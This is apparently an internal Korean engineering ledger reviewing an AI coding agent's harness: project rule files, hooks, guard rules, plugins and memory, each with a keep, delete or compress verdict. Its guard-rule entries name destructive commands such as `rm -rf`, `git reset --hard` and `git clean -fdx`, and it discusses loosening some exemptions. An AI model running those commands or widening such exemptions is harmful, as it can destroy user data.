# 하네스·가이드라인 ablation v2 — 판정 원장 (2026-09-09)

> 지시서 `docs/plans/2026-09-09-harness-ablation-v2-meta-prompt.md` §9.1 형식. 워커 5개(규칙·훅·플러그인·메모리·재발)의 조각 원장을 총괄이 병합했고, 조각의 `잠정` 판정 가운데 총괄이 뒤집거나 확정한 것은 §0 에 모았다. §0 에 없는 행은 조각 판정을 그대로 확정한다. 기준 HEAD: 지시서 `46bdac44d`, 워커 재측정 `fe21a5cc3`(같은 날, 문서 커밋 1건 차이).

## 0. 총괄 확정·번복 (조각 판정과 다른 것만)

총괄이 직접 연 앵커: `CLAUDE.md:48-50`(경로 3개 부재 확인), `.claude/hooks/session_start.py:177-192`(compact 외 무주입 확인), `.claude/hooks/quality_check.py:166-172`(차단 시 로그 없음 확인), `session_start.py:40`(MEMORY_GATE_LINES=160, 현재 159줄), `.mcp.json`(postgres·context7·solapi), `tools/harness/guard_policy.py:469,530`(임시경로 면제가 Remove-Item 에만), `~/AppData/Roaming/orca/logs/daemon.log`(2026-09-08 session-attached), `tests/harness/test_hook_log_hygiene.py:26,184`, `~/.claude/settings.json:58`(`Bash(git push:*)` allow), 인라인 스타일 76행(`git log -p` 재실행), 가드 로그 `_LOG_CAP=300`·타세션 ask 49행에 push 부재. 전부 워커 주장과 일치.

| ID | 조각 판정 | 총괄 확정 | 근거 |
|---|---|---|---|
| P-14 (AI_STATUS 상단 40줄) | KEEP-FACT | **KEEP-FACT** (지시서 §5-14 전제 철회) | `session_start.py:180` 이 2026-08-03 에 정적 안내를 제거했다고 명시. 산문이 유일 경로. 예산 4,000자는 `test_hook_log_hygiene.py:184` 가 강제 |
| P-17 (대화 길어지면 새 세션) | DELETE | **DELETE (RESOLVE 겸함)** | 내장 프롬프트 "컨텍스트 관리: 요약·재공급되므로 일찍 마무리할 필요 없음" 과 정면 상충(총괄 `builtin-overlap.md` B6) |
| P-18~P-23 (등급 마커 `**A~**D`) | KEEP-PREF(L3) | **COMPRESS(L4)** — 마커 1줄 + 가이드 포인터만 남김 | 워커 ④: ledger 58개 완주율 51.7% < 70%, 실사용 마커 9줄(전부 세션 인계 프롬프트). 완주율 미달 원인은 마커가 아니라 ledger 갱신 규율(BLOCKED 13·PENDING 15 방치) — 보고서 ⑥ |
| P-24 (Stop 게이트 산문) | DELETE | **DELETE** | 워커 ②: 차단은 기록되지 않는다(H-37). 훅이 차단 시 stderr 로 이유를 스스로 낸다 |
| P-31b·P-39 (인라인 스타일 금지) | RESOLVE / KEEP-FACT | **MOVE-TO-CODE** (P-39 는 1줄 유지 + 가드 테스트) | 워커 ⑤: 규칙이 두 곳에 있어도 5주간 76행 추가(총괄 재실행 76). 텍스트 두 벌이 준수율을 못 올린 직접 증거 |
| P-32·P-33·P-34 (`apps/api/`·`services/`·`constants.py`) | KEEP-FACT/COMPRESS/DELETE | **KEEP-FACT(정정)** — 실제 경로 `foms/api`·`foms/services`, `constants.py` 는 삭제 | 총괄 `ls` 확인. 없는 경로를 상시 로드하던 상태. 정정은 판정 8종 밖이라 KEEP-FACT 에 괄호로 표기 |
| P-07 ↔ A-06 (브라우저 QA 도구) | RESOLVE(사용자 결정) | **RESOLVE — 열린 질문 ⑥-3** | 어느 쪽이 현재 사실인지 사용자만 안다 |
| P-49 (production push 는 명시 요청 시만) | KEEP-FACT | **KEEP-FACT** (근거 교체) | 조각 근거 "실 ask 16건" 은 전부 테스트 오염(워커 ⑤ 절 0.2). 근거는 L2 사실성 + `permissions.deny` 코드 병행 |
| G-01~G-18 (전역 CLAUDE.md 거의 전부) | RESOLVE/DELETE | **확정** — 전역 파일은 §9.3 초안대로 3줄로 | 총괄 내장 대조: B1·B2·B3·B10·B15 와 겹침. 프로젝트 고유 1줄(서브에이전트 보고 직접 검증)은 프로젝트 CLAUDE.md 로 이동 |
| H-11·H-12·H-17·H-18·H-19·H-20·H-22·H-23 (가드 규칙, 관측창 발화 0) | DOWNGRADE(확신 낮음) | **KEEP-CODE(재관측 보류)** | §4.2 DOWNGRADE 는 "실제 발화 0건" 이 의미 있는 창에서 측정됐을 때만. 관측창 2.4일(`_LOG_CAP=300`)은 부족. 규칙별 추가 지연 0(분류는 한 프로세스 안). 되돌리기 어려운 행동을 막는 규칙은 R2(지연 발현) 대상. 로그 격리·캡 상향 뒤 2주 재관측 후 재판정 |
| H-13 (deploy 타세션 ask) | KEEP-CODE | **KEEP-CODE + 결함 등재** | 실제 95건 중 명령에 `push` 가 없는 행 49건(총괄 `grep -vc push`), 워커 ⑤ 기준 73건 오탐. 분류기가 push 아닌 명령에 발화 — 하루 약 40회 확인 요구는 마찰 비용 |
| H-14·H-16·H-21 (reset --hard·rm -rf·checkout -- 오탐) | DOWNGRADE | **DOWNGRADE(임시경로 면제 확장)** — 규칙 삭제 아님 | `_is_temp_path()` 가 `:530` Remove-Item 에만 걸려 있음(총괄 확인). `_classify_rm`·`_classify_git_reset`·checkout 에 같은 면제를 적용하면 관측된 오탐 전부 소멸 |
| H-15 (`git clean -fdx` deny 1건) | 판정 불가 | **KEEP-CODE** | 정탐이든 오염이든 규칙 자체는 비용 0 |
| H-03 (MEMORY-GATE 160줄) | DELETE | **DELETE → 드리프트 가드 테스트로 이관** | 현재 159줄이라 다음 메모리 추가에 발화 직전. 훅 대신 테스트가 상한(정리 뒤 60줄)을 고정 |
| H-06·H-05·H-07·H-08 (ctx_gate) | DELETE | **DELETE** | 실제 발화 1건 뒤 30분 내 원장 커밋 0. 로그 11행은 발화가 아니라 세션 시작 스킵 |
| H-28·H-29 (동시편집 경고) | DELETE | **DELETE** | 2026-08-31 이후 발화 0 — 세션들이 권고대로 워크트리로 옮겨가자 감지 모집단 밖으로 나갔다 |
| H-43 (orca 10이벤트) | DELETE(사용자 결정) | **열린 질문 ⑥-1** — 삭제 권고, 단 orca 재사용 계획 있으면 유지 | 총괄 확인: daemon.log 마지막 `session-attached` 2026-09-08 09:04(KST), 구 경로 저장소 대상. 비용 도구 호출당 56ms(Bash 35%·Edit 52%) |
| H-45·H-46 (bypassPermissions 에서 훅 ask, 전역 allow vs 프로젝트 deny) | 애매 | **claude-code-guide 조회 결과를 보고서 ⑥ 에 기재** | 실측 대안(ask 유발 명령 실행)은 세션을 막을 수 있어 하지 않음 |
| H-48~H-51 (인벤토리 3종·스캐너) | DOWNGRADE | **DOWNGRADE(키 재정의)** | 게이트 뒤에도 churn 38건, HEAD 자체가 churn 커밋. `(path, symbol, kind)` 키로 재정의하거나 인벤토리를 커밋하지 않고 CI 생성 |
| K-02·K-05·K-07 (플러그인·gstack 스킬 목록) | COMPRESS 후보 | **COMPRESS — 열린 질문 ⑥-4** | 사용 여부는 로그로 판별 불가(Skill 호출 미기록). 목록 비용 합 3,977토큰/세션. 사용자가 실사용 스킬을 지목 |
| K-01·K-18·K-22 (superpowers 훅 복원) | RESOLVE/MOVE-TO-CODE | **RESOLVE + 드리프트 가드 테스트** | 플러그인 비활성(또는 실사용 스킬만 벤더링) + `tests/harness` 가 `enabledPlugins.superpowers=false` 또는 hooks.json 무주입을 단언 |
| K-03·K-04 (caveman) | 보류(L3) | **열린 질문 ⑥-2** | 비용 세션당 약 1,333토큰 + 턴당 16토큰, 상쇄 규칙 3개(P-03b·표 금지·서술 금지) 유발 |
| K-20·K-21 (caveman ↔ 내장 표·서술 규칙) | 의문 | **확정(상충)** | 워커 ③ 은 claude-code-guide 의 "문서 미기재" 로 낮췄으나 총괄이 내장 원문을 직접 봤다: "숫자는 짧은 표로", "시작 전에 한 줄로 무엇을 할지". 문서화 여부와 무관하게 이 세션에 로드된 텍스트끼리 상충한다 |
| K-12·K-13·K-23 (MCP 3벌 불일치) | RESOLVE | **RESOLVE** — `CLAUDE.md:39` 를 `.mcp.json` 실제(postgres·context7·solapi)로 정정, allowlist 의미는 ⑥ 조회 결과 반영 | 총괄 `.mcp.json` 확인 |
| M-03 (앱스크립트 사고, 리포 밖) | KEEP-FACT(애매) | **DELETE** | 프로젝트 범위 밖 1회성 사고 기록. 복원 트리거: 같은 시트 웹훅을 다시 다루게 되면 |
| M-26 (프롬프트 세트 위치, reference) | DELETE(애매) | **KEEP-FACT** | reference 타입은 1줄 포인터라 유지 비용이 낮고 검색 비용을 아낀다(오늘 만든 참조 메모리와 같은 정책) |
| M-01~M-30 나머지 | 조각대로 | **확정** — 표본 DELETE 70% 를 전체에 외삽(153 → 약 46) | 실제 삭제는 사용자가 전수 확인 후 |
| C-01~ (docs/plans 완주율·마커) | L4 COMPRESS | **확정** | 위 P-18~P-23 과 동일 |
| A-05·A-41 (APP_OK·claude_master 두 소비자) | RESOLVE(자구 고정) | **RESOLVE — 두 파일 각 1줄 유지 + 자구 동일 가드 테스트** | AGENTS.md 는 Codex·Cursor 의 유일 파일, CLAUDE.md 는 Claude 의 유일 파일. 한쪽을 지우면 그 도구가 사실을 잃는다 |
| 신설 KEEP-FACT (Railway 서비스 4종) | — | **KEEP-FACT 신설** | 워커 ⑤: `SIDEFX` 에만 키가 없어 지오코딩 사고 규명이 하루 늦었다(`585c225a9`). 초안 CLAUDE.md 에 1줄 |
| 신설 MOVE-TO-CODE 후보 (워커 ⑤ 절 2) | — | **등재, 우선순위 = 인라인 스타일 > `git add -f` ask > 승격 PR 범위 대조 > 파일 단위 세션 귀속** | alembic 단일 head 는 이미 `3b8feba91` 로 pre_push_smoke 편입(총괄 git log 확인) |

## 0.1 판정 분포 (총괄 확정 반영)

| 조각 | 행 수 | KEEP-CODE | DOWNGRADE | KEEP-FACT | KEEP-PREF | DELETE | MOVE-TO-CODE | COMPRESS | RESOLVE | 보류(열린 질문) |
|---|---|---|---|---|---|---|---|---|---|---|
| ① 규칙 3파일 | 136 | 0 | 0 | 28 | 5 | 18 | 2 | 33 | 49 | 1 |
| ② 훅·가드 | 51 | 18 | 7 | 0 | 0 | 8 | 1 | 5 | 4 | 3 (+5 재관측 보류는 KEEP-CODE 에 포함) |
| ③ 플러그인·스킬·MCP | 23 | 0 | 0 | 6 | 0 | 0 | 1 | 3 | 8 | 5 |
| ④ 메모리 표본·플랜 | 30 + 6 | 0 | 0 | 6 | 3 | 21 | 0 | 6 | 0 | 0 |
| ⑤ 재발 대조(증거 표) | 28건 | 5 | 2 | 1 | 0 | 0 | 6 | 0 | 0 | 8 (아무것도 없어 발생) |
| **합** | **274** | 23 | 9 | 41 | 8 | 47 | 10 | 47 | 61 | 17 |

(조각 ① 의 P-18~P-23 6행이 KEEP-PREF→COMPRESS, P-31b·P-39 가 MOVE-TO-CODE, P-32~34 가 KEEP-FACT(정정) 으로 이동한 값. 조각 ② 의 재관측 보류 8행은 KEEP-CODE 로 셈. 워커 원표는 아래 §1~§5 에 그대로 있다.)

## 0.2 절감 합계 (총괄 확정 반영)

| 축 | 절감 | 근거 |
|---|---|---|
| 상시 텍스트 | 프로젝트 CLAUDE.md 108→약 32줄(6,801→약 3,000자), 전역 42→3줄, MEMORY.md 159→약 60줄 | 초안 §9.3, 워커 ④ 외삽 |
| 플러그인 주입 | superpowers 960토큰/세션 제거(확정), caveman 1,333+16/턴(사용자 결정) | 워커 ③ |
| 스킬 목록 | 최대 3,977토큰/세션 중 실사용 외 제거(사용자 지목) | 워커 ③ |
| 훅 지연 | orca 삭제 시 Bash 158→102ms, Edit 108→51ms; ctx_gate 삭제 시 프롬프트당 −49ms | 워커 ② 재측정 |
| 유지 비용 | 인벤토리 churn 커밋 2.6% 소멸(키 재정의 시), Stop 훅 스캐너 예산 최대 −180초 | 워커 ② §6 |
| 상충 | 규칙쌍 6 → 0 (superpowers 4문장·caveman 3문장·MCP 3벌·브라우저 QA 1쌍·내장 1쌍) | 워커 ③ 절 5, 총괄 B6 |

## 0.3 적용 상태 (2026-09-10 적용 세션 — DELETE_LIST 절별)

| 절 | 내용 | 상태 | 커밋 |
|---|---|---|---|
| 1단계 | 문서 5묶음 커밋 | DONE | `168828c81` |
| §1 | 사실 오류 정정(CLAUDE.md:39·48-50·26) + 경로·MCP 드리프트 가드 | DONE | `7eecbb4d2` |
| §2 | 플러그인(superpowers) | DONE — Opus 5 실측(4회 Skill 0) 뒤 off·벤더링 0 | `9c44d7653` |
| §3 | 규칙 파일 교체(프로젝트 CLAUDE.md 35줄·AGENTS.md 압축·전역 CLAUDE.md 5줄) | DONE | `08279d7da` |
| §4 | 프로젝트 훅 해제(ctx_gate·동시편집 경고·MEMORY-GATE·Stop 차단 로깅) | DONE | `af5ba2743` |
| §5 | 가드 인프라 결함 5종 | DONE — 2주 재관측 뒤 재판정 | `f758490b7` |
| §6 | MOVE-TO-CODE(인라인 스타일 ratchet·git add -f ask·승격 PR 범위 대조; 세션 귀속은 별도) | DONE | `8451b64cc` |
| §7 | 메모리 전수 확인·정리(154 → 46) + MEMORY.md 60줄 가드 | DONE | `87773fe95` |
| §8 | 인벤토리 키 재정의 | 범위 밖 — 별도 `**B` | |
| §9 | 사용자 결정 뒤(gstack 57 → 9; orca·caveman 유지; allow 정리 미결) | 부분 DONE(전역 파일, 커밋 없음) | — |
| 3단계 | 실험 부산물 정리(abl_cleanup.sh, Opus 5 부산물 포함) | DONE | `5828c02b0` |
| 마감 | deploy push → pre_push_smoke → ci_watch --quick | 사용자 확인 대기 | |

---



# 조각 1 — ledger-part-1-rules.md

# 원장 조각 ① — 규칙 문서 3종 전수 항목화 (워커 ①)

- 담당: 프로젝트 `CLAUDE.md`(108줄) · 전역 `~/.claude/CLAUDE.md`(42줄) · `AGENTS.md`(84줄)
- 기준 커밋: deploy `46bdac44d` (`git log --oneline -1`)
- 상태 열은 전부 `잠정` — 총괄이 앵커를 직접 열어 확정한다.
- 판정 값은 지시서 §4.2 의 8종만 사용: KEEP-CODE · DOWNGRADE · KEEP-FACT · KEEP-PREF · DELETE · MOVE-TO-CODE · COMPRESS · RESOLVE.
- L1 행은 지시서 지침대로 **산문만** 판정했다(코드 자체 판정은 워커 ②).
- `내장중복의심` 표시는 근거 열 끝에 붙였고, 아래 별도 절에 모았다.

## 0. 이번 조각에서 나온 즉시 보고 사항 2건

1. **프로젝트 `CLAUDE.md:48-50` 디렉토리 구조 절이 사실과 다르다.** `apps/api/`·`services/`·`constants.py` 셋 다 저장소에 없다. 실제 트리는 `foms/api`·`foms/services`·`foms/web`·`foms/persistence`·`foms/platform` 이다(`ls -d apps services constants.py` → 3건 모두 No such file, `ls foms/` → api/persistence/platform/services/web). 즉 상시 로드되는 유일한 파일이 "새 API 는 `apps/api/` Blueprint 로" 라고 **없는 경로로 유도**한다. 현재 작업트리의 수정 파일도 `foms/api/drawing/erp_orders_drawing.py` 다.
2. **지시서 §5 항목 14 의 전제가 틀렸다.** "`session_start.py` 가 이미 AI_STATUS 안내를 주입한다" 는 사실이 아니다. `.claude/hooks/session_start.py:180` 이 "정적 RPI/AI_STATUS 안내는 CLAUDE.md와 중복이라 제거했다(2026-08-03 하네스 ablation)" 라고 명시하고 `_build_context` 는 compact 재개 시에만 문자열을 낸다. 따라서 `P-14` 는 유일한 전달 경로이며 DELETE 대상이 아니다. 다만 40줄 계약 자체는 `tests/harness/test_hook_log_hygiene.py:25,185` 가 코드로 고정한다.

## 1. 프로젝트 CLAUDE.md (P)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감(줄) | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| P-01 | CLAUDE.md:4 | 완료 보고는 한글로 | L3 | 사용자 명시 취향, 대체 강제 수단 없음 | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-02 | CLAUDE.md:5 | 종료 시 AskUserQuestion | L3 | 사용자 명시 취향, 훅 강제 없음(`.claude/settings.json` Stop 훅은 import 검증만) | KEEP-PREF | 0 | 삭제 시 세션이 말없이 끝남 | — | 잠정 |
| P-03a | CLAUDE.md:6 | 한자 금지 | L3 | 사용자 취향. 재발 0건(`git log --since=2026-08-03 --oneline` 결과에서 한자 관련 수정 커밋 0건) | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-03b | CLAUDE.md:6 | caveman 축약보다 본 규칙 우선 | L7 | caveman 플러그인 상쇄 전용 문장. caveman SessionStart 규칙 본문과 정면 상충(지시서 §5 항목 2) | RESOLVE | 1 | caveman 유지 시 삭제하면 한자·축약 유출 가능 | caveman 켠 채 삭제했다가 한자 또는 축약 낱말이 1회라도 나오면 | 잠정 |
| P-04 | CLAUDE.md:9 | 공통 정책 SSOT = AGENTS.md | L2 | AGENTS.md 는 자동 로드 안 됨(지시서 §2.1). 이 문장이 없으면 존재를 모름 | KEEP-FACT | 0 | 없음 | — | 잠정 |
| P-05 | CLAUDE.md:10 | APP_OK 표준 문자열 | L2 | `.claude/hooks/quality_check.py:149,156` 이 같은 문자열로 판정. AGENTS.md:12 에 복제 | KEEP-FACT | 0 | 없음 | — | 잠정 |
| P-06 | CLAUDE.md:11 | 훅 fail-open 은 로그 남길 때만 | L7 | AGENTS.md:14 에 더 긴 원문. 코드는 `quality_check.py:202,206` 이 fail-open 마다 `_log_hook_error` 호출 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-07 | CLAUDE.md:12 | 브라우저 QA = gstack browse | L7 | AGENTS.md:13 과 **상충** — AGENTS.md 는 "Cursor browser MCP 우선, gstack 은 setup 전 미도입" 이라 하고 CLAUDE.md 는 무조건 gstack | RESOLVE | 1 | 상충 유지 시 QA 도구 선택이 세션마다 흔들림 | — | 잠정 |
| P-08 | CLAUDE.md:13 | claude_master 측정 계정 규칙 | L2 | 저장소에서 유도 불가. 정본 `docs/guides/REAL_SERVER_TEST_ACCOUNT.md`. AGENTS.md:67 에 복제 | KEEP-FACT | 0 | 삭제 시 운영 실데이터 오염 위험 | — | 잠정 |
| P-09 | CLAUDE.md:16 | 프로젝트 이름 FOMS | L5 | `README.md`·`app.py` 에서 즉시 유도 가능. AGENTS.md:62 에 복제 | COMPRESS | 1 | 없음 | — | 잠정 |
| P-10 | CLAUDE.md:17 | 스택 나열 | L5 | `requirements.txt`·`models.py` 에서 유도 가능. AGENTS.md:63 에 복제 | COMPRESS | 1 | 없음 | — | 잠정 |
| P-11 | CLAUDE.md:18 | 배포 Railway·브랜치 2단 | L2 | Railway·R2·`deploy`/`production` 2단 흐름은 저장소에서 유도 불가 | KEEP-FACT | 0 | 삭제 시 푸시 대상 혼동 | — | 잠정 |
| P-12 | CLAUDE.md:19 | Windows 11·PowerShell/bash | L2 | cp949 전제. 계약 테스트 `tests/harness/test_powershell_encoding_contract.py` 존재 | KEEP-FACT | 0 | 삭제 시 한글 스크립트 깨짐 | — | 잠정 |
| P-13 | CLAUDE.md:20 | 워크플로우 9단계 나열 | L5 | 루트 `constants.py` 는 **존재하지 않음**(`ls constants.py` → No such file). 단계 열거는 코드에서 grep 으로 확인 가능하나 경로가 문서와 다름 | COMPRESS | 1 | 단계 이름 오타 시 잘못된 상수 사용 | — | 잠정 |
| P-14 | CLAUDE.md:23 | AI_STATUS 상단 40줄 읽기 | L2 | `session_start.py:180` 이 "CLAUDE.md와 중복이라 제거" 라 명시 → 산문이 **유일 경로**. 40줄 계약은 `tests/harness/test_hook_log_hygiene.py:25,185` 가 코드로 고정 | KEEP-FACT | 0 | 삭제 시 세션 시작 오리엔테이션 경로가 사라짐 | — | 잠정 |
| P-15 | CLAUDE.md:24 | 코어 변경 = RPI 필수 | L7 | AGENTS.md:15,19-23 에 같은 프로토콜 전문. 전역 CLAUDE.md:32 에도 승인 게이트 | RESOLVE | 1 | 없음(AGENTS.md 가 본체) | — | 잠정 |
| P-16 | CLAUDE.md:25 | 단순 UI/타이포는 바로 코딩 | L7 | superpowers `brainstorming` HARD-GATE 상쇄 전용(CLAUDE.md:44 후단·전역:33 과 같은 목적) | RESOLVE | 1 | superpowers 켠 채 삭제 시 타이포 수정에도 브레인스토밍 게이트가 걸림 | superpowers 유지한 채 삭제했다가 단순 수정에서 스킬 게이트가 1회라도 걸리면 | 잠정 |
| P-17 | CLAUDE.md:26 | 대화 길어지면 새 세션 권유 | L4 | 1M 컨텍스트 + `PreCompact` 훅(`pre_compact.py:49`)이 체크포인트를 남김. 이 규칙이 막은 실패 기록 없음 | DELETE | 1 | 초장기 세션 품질 저하 | 컴팩트 이후 작업 맥락 유실로 같은 작업을 다시 시작한 사례가 2회 나오면 | 잠정 |
| P-18 | CLAUDE.md:28 | 등급 마커 헤딩(절차 생략 금지) | L3 | 사용자가 프롬프트에 직접 타이핑하는 선언 — 지시서 §5 항목 13 의 재분류 조건(완주율 높고 사용자가 직접 마커 사용)에 해당. 완주율 확정은 워커 ④ | KEEP-PREF | 0 | 마커 의미가 사라지면 `**B`/`**C` 프롬프트가 무시됨 | — | 잠정 |
| P-19 | CLAUDE.md:29 | `**A` 소형 정의 | L3 | 사용자가 프롬프트에 직접 타이핑하는 선언 — 지시서 §5 항목 13 의 재분류 조건(완주율 높고 사용자가 직접 마커 사용)에 해당. 완주율 확정은 워커 ④ | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-20 | CLAUDE.md:30 | `**B` 하루 정의 | L3 | 사용자가 프롬프트에 직접 타이핑하는 선언 — 지시서 §5 항목 13 의 재분류 조건(완주율 높고 사용자가 직접 마커 사용)에 해당. 완주율 확정은 워커 ④ | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-21 | CLAUDE.md:31 | `**C` 릴레이 정의 | L3 | 사용자가 프롬프트에 직접 타이핑하는 선언 — 지시서 §5 항목 13 의 재분류 조건(완주율 높고 사용자가 직접 마커 사용)에 해당. 완주율 확정은 워커 ④ | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-22 | CLAUDE.md:32 | `**D` 최고 안전등급 정의 | L3 | 사용자가 프롬프트에 직접 타이핑하는 선언 — 지시서 §5 항목 13 의 재분류 조건(완주율 높고 사용자가 직접 마커 사용)에 해당. 완주율 확정은 워커 ④ | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-23 | CLAUDE.md:33 | 마커 뒤 글자 붙어도 마커 + 상세 문서 | L3 | 사용자가 프롬프트에 직접 타이핑하는 선언 — 지시서 §5 항목 13 의 재분류 조건(완주율 높고 사용자가 직접 마커 사용)에 해당. 완주율 확정은 워커 ④ | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-24 | CLAUDE.md:36 | Stop 게이트 `import app` 설명 | L1 | 코드가 강제: `.claude/hooks/quality_check.py:139,149,156`. 차단 기록 0건(지시서 §2.4) — 산문은 순중복 | DELETE | 1 | 없음(훅이 스스로 메시지를 냄) | Stop 게이트가 실제로 턴을 차단했는데 원인을 모르는 사례가 나오면 | 잠정 |
| P-25 | CLAUDE.md:37 | push 후 CI 확인·exit 코드표 | L7 | `.claude/hooks/post_push_watch.py:115-122` 가 push 감지 시 같은 안내를 주입. AGENTS.md:73 에 3벌째 | RESOLVE | 4 | 없음 | — | 잠정 |
| P-26 | CLAUDE.md:38 | PreCompact 체크포인트 | L7 | `pre_compact.py:49` 가 파일을 쓰고 `session_start.py:187` 이 재개 시 안내 주입 — 산문 불필요 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-27 | CLAUDE.md:39 | MCP 정본 `.mcp.json` | L2 | MCP 서버 이름은 세션에 나열되나 "루트 `.mcp.json` 이 정본"·yt-dlp 보조는 유도 불가 | KEEP-FACT | 0 | 없음 | — | 잠정 |
| P-28 | CLAUDE.md:40 | 온디맨드 컨텍스트 번들 | L4 | 도구 존재는 `tools/harness/build_context_bundle.py` grep 으로 발견 가능. 사용 기록 미확인 | DELETE | 1 | 조사형 작업에서 번들 도구를 못 찾음 | 컨텍스트 조사 반복 실패로 같은 파일을 3회 이상 다시 읽는 사례가 나오면 | 잠정 |
| P-29 | CLAUDE.md:43 | 프로젝트 스킬 5종 나열 + 제거 이력 | L7 | 스킬 이름·설명은 세션마다 자동 나열됨(지시서 §2.1). 뒷문장은 2026-08-03 이력 기록 | RESOLVE | 2 | 없음 | — | 잠정 |
| P-30a | CLAUDE.md:44 | superpowers 는 온디맨드 호출 | L7 | 스킬 목록 자동 나열과 중복. 전역:33 후단과 같은 취지 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-30b | CLAUDE.md:44 | git 스킬보다 본 파일 우선 + brainstorming 예외 | L7 | 전역 CLAUDE.md:38 에 동일 규칙. superpowers 6.3.0 hooks.json 복원 상충(지시서 §2.6) | RESOLVE | 1 | 플러그인 유지 시 삭제하면 git 절차가 스킬 쪽으로 끌려감 | superpowers 켠 채 삭제했다가 스킬이 제안한 git 절차를 따른 사례가 1회라도 나오면 | 잠정 |
| P-31a | CLAUDE.md:45 | 디자인은 gstack-design-review 주력 | L3 | 도구 선택 취향. 스킬은 전역 `~/.claude/skills` 에 존재 | KEEP-PREF | 0 | 없음 | — | 잠정 |
| P-31b | CLAUDE.md:45 | 인라인 스타일 금지·erp-pro.css 우선 | L7 | 같은 파일 CLAUDE.md:70 에 동일 문장 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-32 | CLAUDE.md:48 | app.py 최소화 / 새 API 는 `apps/api/` | L5 | **경로 오류**: `ls -d apps` → No such file. 실제는 `foms/api`. 닫힌집합 계약 테스트 `tests/domains/test_foms_namespace_imports.py` 존재 | KEEP-FACT | 0 | 지금 문장을 그대로 따르면 없는 디렉토리를 만들어 계약 테스트가 red | — | 잠정 |
| P-33 | CLAUDE.md:49 | `services/`·`templates/`·`static/` | L5 | **경로 오류**: `ls -d services` → No such file(실제 `foms/services`). `templates`·`static` 은 실존 | COMPRESS | 1 | 동상 | — | 잠정 |
| P-34 | CLAUDE.md:50 | `models.py`·`constants.py` | L5 | `models.py` 실존, **`constants.py` 는 없음**(`find . -maxdepth 3 -name "constants*.py"` → 0건) | DELETE | 1 | 상수 위치를 잘못 안내 | 상수 위치를 못 찾아 중복 상수를 새로 만든 사례가 나오면 | 잠정 |
| P-35 | CLAUDE.md:55 | 함수 50줄·docstring·타입 힌트 | L5 | lint 설정 파일이 **하나도 없음**(`ls pyproject.toml setup.cfg .flake8 ruff.toml .pre-commit-config.yaml` → 전부 없음). 위반 수정 커밋 0건. 내장중복의심 | DELETE | 1 | 신규 함수 문서화 품질 하락 | 리뷰에서 docstring/타입 힌트 누락 지적이 2회 이상 반복되면 | 잠정 |
| P-36 | CLAUDE.md:56 | API 응답 형식 `{success,data,error}` | L5 | 프로젝트 고유 계약. 신규 mutation 라우트 계약과 연결 | KEEP-FACT | 0 | 삭제 시 프런트 `data.success` 검증이 깨짐 | — | 잠정 |
| P-37 | CLAUDE.md:57-66 | structured_data JSONB 수정 패턴(코드블록) | L5 | 지시서 §5 항목 15 가 명시한 프로젝트 고유 규약. `flag_modified` 누락 버그 수정 커밋은 최근 0건이나 실패 시 무증상 데이터 유실 | KEEP-FACT | 0 | 삭제 시 JSONB 변경이 조용히 저장 안 됨 | — | 잠정 |
| P-38 | CLAUDE.md:67 | bare except 금지·하드코딩 비밀키 금지 | L7 | lint 설정 부재(위 P-35 근거). AGENTS.md:43 에 더 강한 원문 존재. 내장중복의심 | RESOLVE | 1 | 없음(AGENTS.md 가 본체) | — | 잠정 |
| P-39 | CLAUDE.md:70 | 인라인 스타일 금지 → erp-pro.css | L5 | 지시서 §5 항목 15 명시 규약. 위반 수정 커밋 0건이나 CSS SSOT 는 저장소에서 유도 곤란 | KEEP-FACT | 0 | 삭제 시 인라인 스타일 유입 | — | 잠정 |
| P-40 | CLAUDE.md:71 | jQuery 금지·fetch try/catch·data.success | L5 | 지시서 §5 항목 15 명시 규약 | KEEP-FACT | 0 | 삭제 시 jQuery 재유입 | — | 잠정 |
| P-41 | CLAUDE.md:72 | 인라인 script 300줄·템플릿 800줄 임계 | L5 | 숫자 임계는 유도 불가, 강제 코드 없음, 위반 기록 없음 | COMPRESS | 0 | 임계 없으면 대형 인라인 스크립트 재발 | — | 잠정 |
| P-42 | CLAUDE.md:73 | Jinja2 → JS 는 `data-*` + safeJsonParse | L5 | 지시서 §5 항목 15 명시 규약 | KEEP-FACT | 0 | 삭제 시 `JSON.parse('{{...}}')` 재유입(따옴표 이스케이프 사고) | — | 잠정 |
| P-43 | CLAUDE.md:76 | PostgreSQL 15+·Alembic autogenerate 수동검토 | L5 | 스택 사실은 유도 가능, `downgrade()` 포함 규약은 유도 곤란 | COMPRESS | 0 | 마이그레이션 롤백 불가 | — | 잠정 |
| P-44 | CLAUDE.md:79 | 성능 가드 G1~G4 요약 | L7 | AGENTS.md:26-29 에 G1~G4 전문. 코드 강제 `tests/performance/test_perf_regression_guard.py`(실존) + `scripts/ops/pre_push_smoke.ps1`(실존) | RESOLVE | 1 | 없음 | — | 잠정 |
| P-45 | CLAUDE.md:80 | hot path 쿼리 규칙 | L7 | AGENTS.md:30-31 에 동일 내용 원문 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-46 | CLAUDE.md:83 | 근본 원인 수정만 | L7 | AGENTS.md:34-57 전문(24줄)의 축약본 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-47 | CLAUDE.md:84 | 디버깅 Occam 원칙 | L7 | `.claude/skills/diagnosing-bugs/SKILL.md` 가 같은 주제의 진입점(Phase 1 "tight feedback loop"). 전역:34 가 그 스킬을 가리킴 | RESOLVE | 1 | 스킬 미호출 세션에서 디버깅 원칙 부재 | — | 잠정 |
| P-48 | CLAUDE.md:87 | 커밋 메시지 한글은 `-F` 파일로 | L2 | cp949 전제(AGENTS.md:66 `PS-ENC-01`). 강제 테스트는 스크립트 인코딩만 검사, 커밋 방식은 검사 안 함 | KEEP-FACT | 0 | 삭제 시 한글 커밋 메시지 깨짐 | — | 잠정 |
